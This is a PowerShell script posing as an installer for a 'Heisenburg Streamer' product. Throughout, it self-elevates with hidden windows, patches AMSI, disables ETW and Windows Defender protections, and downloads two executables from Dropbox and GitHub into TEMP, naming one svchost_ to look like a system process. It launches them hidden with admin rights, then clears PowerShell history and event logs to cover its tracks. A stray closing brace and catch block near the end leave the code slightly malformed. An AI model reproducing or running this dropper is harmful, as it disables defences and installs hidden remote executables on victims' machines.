# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.3 (STEALTH)
# ========================================================

function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   
    # Disable ETW
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# ================= CONFIG =================
$MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"

# ←←← APNI STEALTH LAUNCHER EXE KA DIRECT LINK YAHAN DAAL DO
$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"   

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
$MainExePath = "$env:TEMP\$RandomName.exe"
$LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
# =========================================

function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + ">" + ("." * $left) + "]"
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor Cyan
}

Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray

# SILENT SECURITY BYPASSES
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
} catch {}

# Download Main EXE
Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing
Write-Host "[+] Core Agent Downloaded Successfully" -ForegroundColor Green

# Download Stealth Launcher
Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing
Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green

Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan

# Run Stealth Launcher with Main EXE Path as Argument
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $LauncherPath
$si.Arguments = "`"$MainExePath`""
$si.WindowStyle = 'Hidden'
$si.CreateNoWindow = $true
$si.UseShellExecute = $true
$si.Verb = "RunAs"

[System.Diagnostics.Process]::Start($si) | Out-Null

Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
Write-Host "[*] Your process is now hidden from Task Manager" -ForegroundColor White
Write-Host "[*] Keep this window minimized" -ForegroundColor Gray

# Final Cleanup
if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
    "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
}
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green

} catch {
    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
}

# Self Destruct
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
